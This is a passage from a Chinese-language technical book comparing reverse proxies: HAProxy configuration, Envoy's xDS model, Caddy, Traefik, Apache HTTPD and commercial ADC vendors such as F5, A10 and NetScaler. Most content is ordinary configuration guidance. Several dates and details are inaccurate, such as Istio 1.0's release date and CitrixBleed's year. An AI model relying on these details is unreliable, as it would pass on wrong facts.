  • 團隊沒有 Lua 經驗，且不願投資學習
  • 需求是 service mesh 級別的動態配置（用 Envoy）

OpenResty 的學習曲線陡 — Lua 本身好學（兩天上手），但要寫得「如同 Nginx 一樣高性能」需要懂：cosocket vs blocking IO、shared dict 的限制、coroutine、LuaJIT FFI 等。投資值得，但不是輕量決定。

本章要點

OpenResty = Nginx + LuaJIT + lua-resty-* 函式庫。

  • Phase 模型讓 Lua 程式碼能掛在請求生命週期 10 個關鍵點（init / set / rewrite / access / content / header_filter / body_filter / log / balancer）。
  • 關鍵原則：Lua 內絕對不要阻塞 IO，必須用 cosocket。
  • 真實世界應用：Kong API Gateway、Apache APISIX、Cloudflare 邊界 proxy 全是 OpenResty。
  • 2024 年 Cloudflare 開源 Pingora（Rust 寫的下一代 framework）是 OpenResty 之後的演進方向，但 OpenResty 對絕大多數場景仍是首選。

30.2 — frontend / backend / listen：三大配置區塊

HAProxy 配置與 Nginx 截然不同。沒有「server / location」概念，取而代之的是 frontend / backend 分離設計：

HAProxy 配置基本結構global
    # 全域設定（process、log、SSL 等）
    log /dev/log local0
    maxconn 100000
    user haproxy
    group haproxy
    daemon

defaults
    # 預設值（被下面 frontend/backend 繼承）
    mode http
    timeout connect 5s
    timeout client 30s
    timeout server 30s
    log global
    option httplog

frontend https-in
    # 接收 client 連線
    bind *:443 ssl crt /etc/haproxy/cert.pem alpn h2,http/1.1
    bind quic4@*:443 ssl crt /etc/haproxy/cert.pem alpn h3
    # ACL 規則決定路由到哪個 backend
    acl is_api path_beg /api/
    acl is_static path_beg /static/
    use_backend api-pool if is_api
    use_backend static-pool if is_static
    default_backend web-pool

backend api-pool
    # 後端 server 群
    balance leastconn
    option httpchk GET /healthz
    server api1 10.0.0.1:8080 check
    server api2 10.0.0.2:8080 check
    server api3 10.0.0.3:8080 check backup

backend static-pool
    server s1 10.0.1.1:80 check
    server s2 10.0.1.2:80 check

backend web-pool
    balance roundrobin
    server w1 10.0.2.1:80 check
    server w2 10.0.2.2:80 check

三大區塊的職責

  • frontend：定義「怎麼接 client」 — bind 哪個 port、用什麼憑證、處理什麼協定、用 ACL 決定路由
  • backend：定義「怎麼接 server」 — 一群後端、用什麼演算法分配、怎麼 health check
  • listen（少用）：frontend + backend 合二為一的速寫，適合單純場景

這個 frontend/backend 分離的設計是 HAProxy 與 Nginx 最大差異之一。同一個 frontend 能路由到多個 backend（如上例），同一個 backend 能被多個 frontend 共用。配置複用度高。

30.3 — ACL 系統：HAProxy 的決策語言

HAProxy 的 ACL（Access Control List）是一套小型的請求屬性匹配語言。語法：acl <name> <sample-fetch> <matcher> <value>。

ACL 的多種應用frontend main
    bind *:443 ssl crt /etc/haproxy/cert.pem

    # Path 匹配
    acl is_api      path_beg /api/
    acl is_admin    path /admin
    acl is_static   path_end .css .js .png .jpg

    # Header 匹配
    acl is_mobile   hdr(User-Agent) -i -m sub Mobile
    acl is_internal hdr(X-Source) "internal"

    # Source IP 白名單（從檔案讀）
    acl trusted_ips src -f /etc/haproxy/trusted-ips.lst

    # SSL SNI 匹配（多租戶時關鍵）
    acl is_tenant_a ssl_fc_sni -i a.example.com
    acl is_tenant_b ssl_fc_sni -i b.example.com

    # 方法匹配
    acl is_write    method POST PUT DELETE PATCH

    # 組合 ACL（ACL 之間是 AND，多個 acl 同名是 OR）
    http-request deny if is_admin !trusted_ips     # /admin 但非可信 IP

    use_backend api-pool      if is_api
    use_backend tenant-a-pool if is_tenant_a
    use_backend tenant-b-pool if is_tenant_b
    use_backend mobile-pool   if is_mobile
    default_backend web-pool

ACL 的強大之處：

  • 幾百種內建 sample fetch（取資訊）：src、path、hdr、cookie、ssl_fc_*、req.body_size 等
  • 豐富 matcher：精確、子字串、前綴、regex、IP 範圍、CIDR、檔案 lookup
  • 大小寫不敏感（-i）、支援 negation（!）、組合（AND/OR）
  • 支援 stick tables（§30.5）動態判斷 — 如「過去 1 分鐘已收到 100 個請求的 IP」

ACL 是 HAProxy 哲學的核心：把決策邏輯寫在配置檔中，不用 Lua 不用外部 service。但這也是學習曲線 — 要熟悉好幾百個 sample fetch 才能完全發揮。

30.4 — 負載平衡演算法

HAProxy 提供的負載平衡演算法比 Nginx 更全面：

演算法directive適用
Round-robinbalance roundrobin動態 weight，最常用
Static RRbalance static-rr不支援 dynamic weight，但 server 上限無限
Least connectionsbalance leastconn長連線（DB、WebSocket）
Source hashbalance source同 client IP 進同 server（窮人 sticky）
URI hashbalance uri同 URL 進同 server（cache 友好）
URL parameterbalance url_param userid用 query 參數做 hash
Header hashbalance hdr(X-User)用任意 header 做 hash
Randombalance random隨機（含 power-of-two）
Firstbalance first主動主備（前面有空就用前面）

HAProxy 的 hash 演算法支援 consistent hashing（hash-type consistent）— 後端增減時，只有少量 key 需要重新分配，這在 cache 場景特別重要。

30.5 — Stick tables 與 peers protocol

Stick tables是 HAProxy 的「state store」。能 track 任何 sample fetch 的值，並在多個 HAProxy 實例之間透過 peers protocol 同步。應用：

  • Sticky session（記住 client 該去哪個 server）
  • Rate limiting（記住每個 IP 的請求數）
  • 並發連線追蹤
  • 分散式狀態（多個 HAProxy 共享）
stick tables 做進階限流backend api-pool
    # 定義 stick table：以 src IP 為 key，記住
    # conn_rate（每 10s 連線數）、http_req_rate（每 10s 請求數）
    stick-table type ip size 100k expire 30s store conn_rate(10s),http_req_rate(10s),http_err_rate(10s)

    # 把每個請求 track 到 stick table
    http-request track-sc0 src

    # 拒絕：每 10 秒超過 100 個請求
    http-request deny if { sc0_http_req_rate gt 100 }

    # 拒絕：4xx 錯誤率太高的 IP（可能在掃 endpoint）
    http-request deny if { sc0_http_err_rate gt 10 }

    server s1 10.0.0.1:8080 check
    server s2 10.0.0.2:8080 check

# peers protocol：跨多個 HAProxy 同步 stick table
peers haproxy-cluster
    peer ha1 10.10.0.1:10000
    peer ha2 10.10.0.2:10000
    peer ha3 10.10.0.3:10000

這個機制讓 HAProxy 不需要 Redis 等外部 store 就能做分散式狀態追蹤。Peers protocol 用 TCP 連線，broadcast 變化給其他 peer，O(N²) 擴散但對 N<10 完全可接受。

30.6 — Health Check：httpchk、agent-check

HAProxy 的 health check 比 Nginx OSS 強大得多 — 主動探測是內建功能：

多種 health check 方式backend api-pool
    # 1. HTTP health check
    option httpchk
    http-check send meth GET uri /healthz ver HTTP/1.1 hdr Host healthcheck.local
    http-check expect status 200-299

    # 2. 進階：基於 response body 內容判斷
    http-check expect string "\"status\":\"ok\""

    # 3. agent-check：server 自己回報「健康度分數」
    # server 上跑一個小 daemon，回報 "ready up 80%"、"drain"、"down" 等
    server s1 10.0.0.1:8080 check agent-check agent-port 5555

    # 4. 進階：定期改變 weight（漸進式上線）
    server s2 10.0.0.2:8080 check weight 10 slowstart 30s

關鍵特性：

  • option httpchk + http-check：HTTP 層 health check，能 send custom header、verify body content
  • agent-check：server 主動回報「現在能承受多少」，HAProxy 動態調整 weight
  • slowstart：新加入的 server weight 漸進升上來，避免冷啟動受不了

  • Nginx：40,000+ RPS、CPU ~60%、記憶體 ~80MB
  • Envoy：35,000+ RPS、CPU ~73%、記憶體 ~150MB

HAProxy 在 K8s ingress controller benchmark 中達到 42,000 RPS、CPU 50%、0 errors（vs Traefik 的 19,000 RPS + 1,342 errors）。在純 LB 場景，HAProxy 至今未被超越。

但 HAProxy 在 dynamic 環境（K8s pod scaling）有個著名缺點：新 server 加入要 reload 配置，reload 過程中 latency 可能 spike 到 25 秒。Envoy 在這個場景顯著好（sub-10ms），這是下一章 Envoy 的核心優勢。

Envoy 與雲原生
Lyft 2016 年開源、Service Mesh 時代的事實標準

Envoy 不是另一個 reverse proxy — 它是「universal data plane」，為微服務時代設計。Istio、Consul Connect、AWS App Mesh 全建在它之上。本章解構 xDS API、filter chain、為什麼 Envoy 在 dynamic 環境比 HAProxy / Nginx 更強。

2016 年 Lyft 工程師 Matt Klein 設計 Envoy 時，把目標訂得很清楚：「建一個能看見所有微服務流量的 universal proxy」。Lyft 當時遇到的痛點：上百個微服務、每個用不同語言、每個團隊重複實作 retry / timeout / circuit breaker / observability。Envoy 的解法是 sidecar 模式 — 每個應用旁邊跑一個 Envoy，所有網路功能都集中到 Envoy，應用回歸做業務邏輯。這個架構後來成為 Service Mesh 的基礎。本章解構這個 2026 年仍主導雲原生網路的工具。

31.1 — Envoy 的起源與 CNCF 畢業

關鍵時間軸：

  • 2016/09：Lyft 開源 Envoy（C++ 寫的 L4/L7 proxy）
  • 2017/09：Envoy 加入 CNCF（Cloud Native Computing Foundation）
  • 2018/01：Istio 1.0 發布（基於 Envoy）
  • 2018/11：Envoy 成為 CNCF 第三個畢業專案（Kubernetes、Prometheus 之後）
  • 2020+：成為主要雲廠商的 service mesh / API gateway 基礎
  • 2024+：Envoy Gateway（Kubernetes Gateway API 實作）成熟

2026 年 Envoy 仍由 Matt Klein（已離開 Lyft，創辦 Bitwave）與 CNCF 社群共同維護，每月發布 minor 版本。當前 stable 版本是 1.34.x（2026/04）。

Envoy 內建 50+ filters，加上 WebAssembly filter（用任何能編成 wasm 的語言寫）。2024 年起 wasm filter 在生產環境普及，Istio 與多個 service mesh 都支援。

31.4 — xDS API：Envoy 的靈魂

這是 Envoy 與其他 proxy 最重要的差異。xDS（X Discovery Service）是一組 gRPC API，讓外部 control plane 動態下發配置給 Envoy data plane，不需要 reload。

五個核心 xDS API

API全名下發內容
LDSListener Discovery ServiceListener（要 bind 哪些 port、TLS 設定）
RDSRoute Discovery ServiceHTTP 路由規則（path → cluster）
CDSCluster Discovery Service後端 cluster（一群相同 service 的 endpoints）
EDSEndpoint Discovery Service實際 endpoint IP 列表（最頻繁變動的）
SDSSecret Discovery ServiceTLS 憑證（動態輪替不需 reload）

還有 ADS（Aggregated Discovery Service）把上述五個合在一條 gRPC stream 上，避免 update 順序問題（如 listener 引用了不存在的 cluster）。

為什麼 xDS 是 game changer

傳統 reverse proxy（HAProxy / Nginx）的工作流：

  1. 後端 server 變了（K8s pod 加減、scaling、deploy）
  2. Operator（人工或自動化）改 nginx.conf / haproxy.cfg
  3. Reload
  4. Reload 期間有 latency spike（HAProxy 文獻記錄到 25 秒）

Envoy 的工作流：

  1. 後端 server 變了
  2. Control plane 透過 xDS gRPC stream 推送新 endpoint 列表
  3. Envoy 收到後 atomic swap，無 reload、無中斷、sub-10ms 完成

這就是 K8s 與微服務環境選 Envoy 的根本原因。在 pod 每分鐘 scaling 100 次的環境，Nginx / HAProxy 的 reload model 完全無法跟上。

31.5 — gRPC + gRPC-Web 的完整支援

Envoy 對 gRPC 是 first-class citizen — 不是「順便支援」而是核心設計動機之一：

  • gRPC HTTP/2 routing：原生理解 gRPC 語義（不只是 HTTP/2 router）
  • gRPC-Web filter：把瀏覽器的 HTTP/1.1 gRPC-Web 請求轉成後端的 gRPC HTTP/2
  • gRPC-JSON transcoder：把 REST JSON 翻譯成 gRPC（讓現有 REST client 透明使用 gRPC backend）
  • gRPC stats：詳細的 per-method gRPC 監控（success rate、latency、message size）

2026 年 gRPC 是內部微服務通訊的事實標準，Envoy 在這個領域的地位幾乎無可撼動。

31.7 — 性能特性：Envoy 在哪些場景贏？

Envoy 的 raw throughput 不如 HAProxy（35,000 vs 50,000 RPS），記憶體更高（150MB vs 50MB）。但在動態環境勝出：

  • Pod scaling 期間：Envoy sub-10ms latency vs HAProxy 25-second spike
  • 高 core 數機器：Envoy 多執行緒 scale 比 Nginx 好（128+ cores）
  • 觀察性：每個 listener / cluster / route 都有獨立 stats，遠超 Nginx OSS
  • 協定豐富度：原生 gRPC、Redis proxy、Kafka proxy、Dubbo（Alibaba 微服務協定）

但cost：

  • 學習曲線陡（YAML 配置巨大且嵌套深）
  • 記憶體消耗高（150MB 起，sidecar 模式 N 倍 pods 後成本可觀）
  • HTTP/3 仍 alpha（vs Nginx production-ready 自 1.25.0）
  • 純 reverse proxy 場景殺雞用牛刀

31.9 — 何時該選 Envoy？決策矩陣

該選 Envoy 的場景

  • K8s + 微服務環境，pod scaling 頻繁
  • 需要 service mesh（Istio、Consul Connect）
  • 多語言微服務，要統一 observability
  • API Gateway（透過 Envoy Gateway 或 Solo Gloo）
  • 需要 gRPC 完整支援（HTTP/2 routing、gRPC-Web、JSON transcoding）
  • 觀察性是首要需求（每個 listener / cluster 獨立 metrics）

不該選 Envoy 的場景

  • 單體應用 + 少數靜態 backend（用 Nginx 就好）
  • 純粹要極致性能 LB（用 HAProxy）
  • 需要 HTTP/3 production（用 Nginx 1.25+）
  • 團隊沒有 K8s 經驗（Envoy YAML 學習曲線可怕）
  • 記憶體預算緊（150MB × N pods 累加）
  • 需要 Lua 客製邏輯（用 OpenResty 更直接）

實務上，2026 年的真實架構往往是混合：邊界（公網 → 機房）用 Nginx 或 HAProxy，內部微服務用 Envoy（透過 Istio）。這個分工反映了兩類工具的設計初衷不同 — 沒有「全勝」的 reverse proxy。

Caddy、Traefik 與 Apache HTTPD
三個風格迥異的 reverse proxy / web server

Nginx、HAProxy、Envoy 之外，2026 年仍有三個值得認識的選項：Caddy（自動 HTTPS 創始者）、Traefik（容器原生）、Apache HTTPD（仍佔市場相當份額的活化石）。本章解構各自的設計哲學與實際採用情境。

Reverse proxy 領域不只 Nginx / HAProxy / Envoy。Caddy（2015 起，Matt Holt 開發）以「自動 HTTPS」作為核心訴求徹底改變了個人網站的部署體驗；Traefik（2016 起，法國 Containous 公司）為容器時代而生，以 label-based 配置與服務自動發現為賣點；Apache HTTPD 雖然 2010 年代被 Nginx 超越，2026 年仍在傳統企業（特別是 PHP / WordPress / 政府網站）有大量部署。本章帶你建立三者的完整認識 — 不是要說服你選哪一個，而是讓你遇到時知道是什麼東西。

32.1 — Caddy：自動 HTTPS 的原創者

Caddy 由 Matt Holt 在 2015 年開始開發，是世界上第一個預設啟用 HTTPS 的 web server。其他 web server 把 HTTPS 當作「可選功能要配置」，Caddy 反過來 — 你給它一個域名，它自動申請 Let's Encrypt 憑證、自動配置 TLS、自動重定向 HTTP → HTTPS、自動處理憑證 renewal。

2026 年版本

當前最新是 Caddy v2.11.1（2026/03 釋出）。重要新功能：

  • Encrypted Client Hello（ECH）keys 自動輪替：與 Nginx 1.29.4+ 並列為支援 ECH 的主流 web server
  • Time-rolling log options：log 自動 rotation
  • Reverse proxy 自動 rewrite Host header 到 upstream 位址（解決 §28.2 提到的常見坑）
  • 實作並要求 PR / issue 的 Assistance Disclosures（AI/LLMs）：要求貢獻者揭露 AI 協助的程度

2026/03 也揭露了 5 個 CVE（CVE-2026-27585 至 27590），涵蓋 path matcher、host matcher、TLS client auth、fastcgi 與 admin API — 全部已修補。Caddy 的 CVE 揭露品質高，定期更新很重要。

Caddyfile：人類可讀的配置格式

On-Demand TLS：白標 SaaS 的秘密武器

Caddy 最獨特的功能是 On-Demand TLS — 在 TLS 握手期間動態取得憑證。場景：你做一個白標 SaaS 平台（如 Shopify、Webflow），客戶可以把自己的域名指向你的 server。

傳統做法：客戶提交域名 → 後端任務系統申請 Let's Encrypt 憑證 → reload web server。整個流程數分鐘到數小時，運維複雜。

Caddy On-Demand TLS：客戶 DNS 指過來 → 第一次連線時 Caddy 即時申請憑證 → 同時完成握手。數百萬個域名都能 just-work。Cloudflare for SaaS、Vercel、Heroku 等都採用類似機制（雖然不一定用 Caddy）。

Caddy 的限制

  • 性能不如 Nginx / HAProxy（Go runtime 成本）— 但對 95% 場景足夠
  • 記憶體佔用較大（Go GC）
  • 動態配置要透過 admin API（JSON），Caddyfile 是給靜態場景的
  • Plugin 要靜態編譯進 binary（用 xcaddy 工具），不像 Nginx module 那樣 load_module 動態載入

32.2 — Traefik：容器時代的 reverse proxy

Traefik 由法國 Containous 公司在 2016 年開源，2018 年公司改名 Traefik Labs。設計目標：把 reverse proxy 配置從靜態檔案搬到容器 metadata。

Label-based 配置

Traefik 的核心創新：不用寫配置檔，把 routing 規則寫在容器 label 上。

Listing 32.2 · Docker Compose 整合 Traefikversion: '3.8'
services:
  # Traefik 本體
  traefik:
    image: traefik:3.0
    command:
      - "--providers.docker=true"
      - "--providers.docker.exposedbydefault=false"
      - "--entrypoints.web.address=:80"
      - "--entrypoints.websecure.address=:443"
      - "--certificatesresolvers.le.acme.email=admin@example.com"
      - "--certificatesresolvers.le.acme.tlschallenge=true"
      - "--certificatesresolvers.le.acme.storage=/letsencrypt/acme.json"
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./letsencrypt:/letsencrypt

  # 你的應用 — 配置就寫在 labels 上
  webapp:
    image: myapp:latest
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.webapp.rule=Host(`app.example.com`)"
      - "traefik.http.routers.webapp.entrypoints=websecure"
      - "traefik.http.routers.webapp.tls.certresolver=le"
      - "traefik.http.services.webapp.loadbalancer.server.port=3000"

  # 加一個服務 — Traefik 自動發現並路由
  api:
    image: myapi:latest
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.api.rule=Host(`api.example.com`)"
      - "traefik.http.routers.api.entrypoints=websecure"
      - "traefik.http.routers.api.tls.certresolver=le"

docker compose up 後，Traefik 會：

  1. 透過 Docker socket 發現所有 container
  2. 讀 label 取得每個 container 的 routing 規則
  3. 自動申請 Let's Encrypt 憑證（透過 TLS-ALPN-01 challenge）
  4. 建立路由表並開始服務

新增、刪除、更新 container 時 Traefik 自動重新配置 — 不需要 reload、不需要改檔案。這個 UX 在容器化環境是革命性的。

2026 年版本與生態

  • Traefik v3.0（2024/04）為當前主流，新增 OpenTelemetry 原生支援、Kubernetes Gateway API
  • Traefik v3.5（2026/01）為最新，加強 WebAssembly plugin、HTTP/3 穩定化
  • Provider 範圍：Docker、Kubernetes（Ingress + Gateway API）、Consul、Nomad、ECS、KV stores（etcd、Zookeeper、Redis）、靜態檔案
  • Traefik Hub（商業版）：API Gateway、API Management、API Catalog（2024+）
  • Traefik Mesh（前 Maesh，service mesh）— 但 2024 年 archived，社群轉向 Linkerd / Istio

Traefik 性能侷限

Traefik 在 2025 K8s ingress benchmark 中達到 19,000 RPS（vs HAProxy 42,000 / Nginx 40,000）。Stress test 下還出現 1,342 errors（HAProxy 是 0）。性能不是 Traefik 的賣點 — UX 與容器整合度才是。對中小流量（<10K RPS）的容器化部署，Traefik 是最舒服的選擇；對網際網路規模 LB，仍要選 HAProxy / Nginx。

32.3 — Apache HTTPD：被超越的活化石

Apache HTTPD（簡稱 Apache）是 1995 年就有的老牌 web server，曾經是世界第一（2000 年代市佔超過 60%）。2010 年代起被 Nginx 超越，2026 年市佔約 25%（Nginx ~35%、Cloudflare 內建 Server header ~20%、剩下小眾）。但 Apache 仍有大量遺留部署，運維工程師遲早會遇到。

Apache 的歷史優勢

  • 豐富的 module 生態：mod_php、mod_perl、mod_python、mod_wsgi、mod_security 等
  • .htaccess：每個目錄能放配置檔，方便共享主機（shared hosting）
  • 強大的 mod_rewrite：URL 重寫規則語言（複雜但無所不能）
  • 歷史地位：所有人都會、所有教學都基於它

為什麼被 Nginx 超越

關鍵在 process model：

Apache MPM模型並發極限
prefork（最早）每連線一個 process~256，process fork 成本高
worker每 process 多 thread~10K，但 mod_php 不支援
event（2012+ 預設）類 Nginx，event-driven~10K-50K

event MPM 出現太晚（2012 才預設啟用），那時 Nginx 已經佔據高效能市場。加上 Apache 的記憶體佔用（每連線數 MB vs Nginx 的數 KB）讓它在高並發場景處於劣勢。

Apache 在 2026 年的位置

  • WordPress 與 PHP 應用：mod_php 仍是最容易的 PHP 部署，特別是傳統 cPanel / Plesk 共享主機
  • 政府網站：許多政府部門 stack 從 2000 年代起未改
  • 企業內部應用：jBoss、WebSphere 等 Java 應用前端常用 Apache + mod_jk / mod_proxy_ajp
  • 歷史 SaaS 平台：cPanel 預設 web server

Apache 的 reverse proxy 能力靠 mod_proxy + mod_proxy_http + mod_proxy_balancer，配置可用但比 Nginx 繁瑣：

Apache reverse proxy 範例<VirtualHost *:443>
    ServerName app.example.com

    SSLEngine on
    SSLCertificateFile /etc/ssl/cert.pem
    SSLCertificateKeyFile /etc/ssl/key.pem

    <Proxy balancer://mycluster>
        BalancerMember http://10.0.0.1:8080 route=node1
        BalancerMember http://10.0.0.2:8080 route=node2
        ProxySet lbmethod=byrequests
    </Proxy>

    ProxyPreserveHost On
    ProxyPass        /api/ balancer://mycluster/
    ProxyPassReverse /api/ balancer://mycluster/

    Header set X-Forwarded-Proto "https"
</VirtualHost>

能用，但不是現代工程師會主動選的方案。

何時你會遇到 Apache

  • 接手有 10+ 年歷史的系統
  • 客戶的伺服器是 cPanel / Plesk 控制台
  • WordPress 託管
  • 內部企業網站（intranet）多年未更新
  • 學術機構 / 政府網站

遇到 Apache 不要急著換。它穩定運行多年的話通常還能再撐多年。遷移風險常常大於收益，除非有具體的性能或安全瓶頸。

Chapter 33

商業 ADC
F5、A10、Citrix 與正在萎縮的硬體 LB 市場

2010 年以前，企業 LB 等於 F5 BIG-IP — 一台 USD $50K-200K 的硬體設備。2026 年雲端 LB（AWS ALB、GCP LB）與開源軟體（Nginx、HAProxy、Envoy）正在系統性取代這個市場。本章解構主要商業 ADC 廠商與這個產業的衰退軌跡。

ADC（Application Delivery Controller）是商業圈對「企業級 LB + 多功能 reverse proxy」的稱呼。1996 年 F5 Networks 推出 BIG-IP 後成為金融、電信、政府等高合規行業的標準。2026 年的真實情況是：商業 ADC 市場正在萎縮 — 雲端 LB 已能處理 90% 場景、開源工具能處理另外 9%、剩下 1% 才是商業 ADC 的最後堡壘。本章不是要說服你買 F5，而是讓你遇到時知道是什麼東西。

33.1 — F5 BIG-IP：仍是金融與電信的事實標準

F5 Networks 1996 年成立於西雅圖，BIG-IP 是其旗艦產品。2019 年 F5 收購 Nginx Inc. — 這個併購本身就反映了市場變化：F5 自知純硬體生意有限，必須擁抱軟體。

BIG-IP 的硬體與軟體

  • BIG-IP iSeries：硬體 appliance，內建 ASIC 加速 SSL 與封包處理（單台價格 USD $50K-300K+）
  • BIG-IP Virtual Edition (VE)：軟體版，跑在 VMware / KVM / 公有雲上
  • BIG-IP Next（2024+）：F5 的 K8s-native 重寫，整合 NGINX

BIG-IP 的核心功能

  • LTM（Local Traffic Manager）：核心 LB + reverse proxy
  • GTM / DNS：全球流量管理（GSLB），跨資料中心 DNS-based 路由
  • ASM（Application Security Manager）：WAF
  • APM（Access Policy Manager）：SSL VPN + 認證 gateway
  • iRules：強大的 TCL-based scripting 語言（類比於 OpenResty 的 Lua）

為什麼金融與電信仍買 F5

  • 合規認證：FIPS 140-2/140-3（密碼學模組）、Common Criteria、PCI-DSS 等政府需要的認證一應俱全
  • SLA 與支援：原廠 24/7 工程師、現場 RMA、保固 5+ 年
  • iRules 客製化：交易系統的特殊 routing 邏輯（按帳號分流、延遲敏感路由）F5 用 iRules 寫得很自然
  • 歷史投資：金融機構的 F5 是 20 年累積的腳本與規則，遷移風險過大
  • 硬體 SSL 加速：高速交易場景下 ASIC 仍比軟體快（雖然現代 CPU 加密已很快）

2026 年 F5 在金融、電信、政府仍是事實標準。但 F5 自己的策略是把客戶從 BIG-IP 推向 NGINX + F5 Distributed Cloud（雲端 SaaS）— 公司內部都知道純硬體生意難以為繼。

33.2 — A10 Networks：台灣常見的「便宜版 F5」

A10 Networks 由前 F5 工程師 Lee Chen 在 2004 年創辦。產品定位明確：「F5 能做的我也能做、價格便宜 30-50%」。

產品線

  • Thunder ADC：核心 LB（對應 F5 BIG-IP LTM）
  • Thunder TPS：DDoS 防護（對應 Arbor / Radware）
  • Thunder CGN：Carrier Grade NAT（電信運營商用）
  • Thunder SSLi：SSL Forward Proxy（cf. Ch.19）

A10 在台灣與亞洲的地位

A10 在台灣相當常見 — 中華電信、富邦、玉山、中信等金融機構都有 A10 部署。原因：

  • 價格比 F5 便宜 30-50%
  • aXAPI（REST API）對自動化友好（比 F5 的 iControl 簡單）
  • aFleX scripting（類 iRules，TCL-based）
  • 台灣有原廠在地團隊與技術支援
  • 韓國電信運營商大量採用，亞洲市場有口碑

A10 在 2024 年面對營運挑戰，2025 年市場份額略有萎縮但仍是第二大商業 ADC 廠商。

33.3 — Citrix NetScaler：與 Citrix Virtual Apps 緊密綁定

NetScaler 由 Citrix 在 2005 年收購（從 NetScaler Inc. 同名公司收購）。2022 年 Citrix 把 NetScaler 從母公司拆出，與 ShareFile、Wrike 一起成為「Cloud Software Group」的獨立產品線。

NetScaler 的差異化

  • 與 Citrix Virtual Apps and Desktops（前 XenApp / XenDesktop）緊密整合：HDX 協定優化、ICA proxy
  • NetScaler Gateway：SSL VPN + RDP / ICA proxy（VDI 環境必備）
  • NetScaler ADC：通用 LB
  • 強大的 SSL 終端：硬體加速、密碼套件管理

2024 年的 CitrixBleed 災難

2023 年 10 月揭露的 CVE-2023-4966（CitrixBleed）是 NetScaler 歷史上最嚴重的漏洞之一。攻擊者能從 NetScaler 記憶體 dump 出 session token 完全繞過 MFA。利用簡單、影響重大 — 多家美國醫療機構、Boeing、ICBC 等被勒索軟體攻擊源頭即為此漏洞。

2024 年陸續又有 CVE-2023-6548、CVE-2024-8534、CVE-2024-8535 等漏洞。NetScaler 在 2024-2026 年的安全紀錄極差，這嚴重打擊客戶信心。許多企業正積極評估替代方案。

33.4 — Imperva、Radware、Barracuda：細分領域

  • Imperva：以 WAF 起家（DDoS、bot management、API security 是強項）。2014 年被 Thoma Bravo 收購、2023 年 Thales 以 USD $3.6B 再收購
  • Radware：以色列廠商，DDoS 防護領域強（Alteon LB + DefensePro DDoS）
  • Barracuda：中小企業導向，WAF、Email Security、Web Filtering 整合產品線
  • Fortinet FortiADC：Fortinet 從防火牆延伸的 ADC 產品，整合 FortiGate firewall
  • Kemp Technologies：2021 年被 Progress 收購，中小型 ADC 市場

這些廠商的共同點：不直接挑戰 F5 在金融的地位，而是在細分市場找空間。Imperva 主打 WAF + DDoS；Radware 主打 DDoS；Barracuda 主打中小企業；Fortinet 主打安全整合方案。

33.5 — 雲端 LB：商業 ADC 的最大威脅

2010 年以後，雲端 LB 是商業 ADC 市場的最大破壞者：

雲端 LB 的優勢：

  • 零硬體投資：不需要採購 + 裝機 + 折舊
  • 託管：升級、修補、HA 都由雲商處理
  • 彈性：分鐘級擴展容量
  • 原生整合：與 Auto Scaling、ECS、ECS、Lambda 等緊密整合
  • 合規認證：AWS、GCP、Azure 都有完整 PCI、HIPAA、SOC 2 等認證

對新建的雲端應用，幾乎沒理由用商業 ADC。F5 BIG-IP VE 等軟體版仍能跑在公有雲，但已失去 ASIC 加速優勢。商業 ADC 的最後堡壘是混合雲與 on-prem 環境，特別是有合規要求的傳統行業。

33.6 — 開源 ADC：另一個威脅

除了雲端 LB，開源軟體也在啃食商業 ADC 市場：

  • Nginx Plus：F5 自己的開源產品在搶 BIG-IP 的中低階市場
  • HAProxy Enterprise：金融機構替代 BIG-IP LTM 的選擇
  • Envoy + Istio：K8s 環境直接消滅商業 ADC 的需求
  • Cloudflare：邊界 LB 與 WAF 場景全面替代

Stack Overflow Architecture 2016 年公開分享：「我們用 4 台 HAProxy 代替了 6 台 F5 BIG-IP，省了 USD $250K」。類似案例在 2020 年代成為行業常態。

33.7 — 商業 ADC 何時仍是正確選擇？

誠實說：2026 年仍然有少數場景商業 ADC 是最佳選擇：

  • 金融高頻交易：每微秒延遲都是錢，硬體 ASIC 仍勝過軟體
  • 政府 / 軍方：FIPS 140-2/3 認證硬體要求
  • 傳統電信：BNG（Broadband Network Gateway）、CGN 等規模需要硬體
  • 大型 SSL 卸載：100+ Gbps 加密流量場景，硬體 ASIC 更穩定
  • 已有 20 年 BIG-IP 投資：iRules 腳本遷移風險過大

對其他 99% 場景，雲端 LB 或開源 reverse proxy 才是現代答案。如果你是創業公司、雲原生團隊、新建系統 — 你不需要、也不應該用商業 ADC。

34.2 — 性能（HAProxy 的領域）

純粹比較 raw throughput 與記憶體，HAProxy 是業界第一。但性能不是線性的指標：

  • 低流量場景（<1K RPS）：所有工具都遊刃有餘，性能差異看不出來
  • 中流量（1K-10K RPS）：四核機器都能應付，工具選擇影響不大
  • 高流量（10K-50K RPS）：開始看到差異，HAProxy 領先 25-30%
  • 網際網路規模（50K+ RPS）：HAProxy / Nginx 是現實選擇，其他需要更多硬體

但單機性能不是唯一指標。HAProxy 在 K8s pod scaling 場景的 25 秒 reload spike 在某些業務場景比 raw RPS 更要命 — 那種環境 Envoy 雖然 raw RPS 較低，總體更適用。

34.3 — 動態配置（Envoy 的領域）

Envoy 的 xDS API 是其他所有工具望塵莫及的。但大多數環境根本不需要這個能力：

  • 單體應用 + 固定後端：reload 一年幾次，nginx -s reload 完全足夠
  • 傳統 VM 部署：後端變動慢，HAProxy Runtime API 即可
  • K8s + 微服務：xDS 才開始真正發揮價值
  • Service Mesh：xDS 是必需（Istio 必選 Envoy）

如果你的 backend 一週變更不到 5 次，xDS API 對你沒意義。

34.4 — 觀察性

2026 年 observability 是運維的核心議題。各工具在這方面的差異：

  • Envoy：每個 listener、cluster、route 都有獨立 metrics（請求數、延遲分位、status code 分佈）。Prometheus exporter 內建。是業界第一
  • HAProxy：stats page 與 socket query 提供豐富資訊，stick tables 讓你能追蹤任意維度。Prometheus exporter 自 2.0+ 內建
  • Nginx OSS：基本 stub_status，要詳細 metrics 要 Plus 或第三方 module（VTS、Lua）
  • Caddy：內建 Prometheus metrics，但細節較少
  • Traefik：原生 OpenTelemetry 支援（v3+），不錯但深度仍不及 Envoy

34.5 — Service Mesh（Envoy 一家獨大）

2026 年 Service Mesh 領域 Envoy 幾乎一家獨大：Istio、Consul Connect、AWS App Mesh、Kuma 全部基於 Envoy。Linkerd 是唯一例外，用自家的 linkerd2-proxy（Rust 寫，輕量，但 feature 較少）。

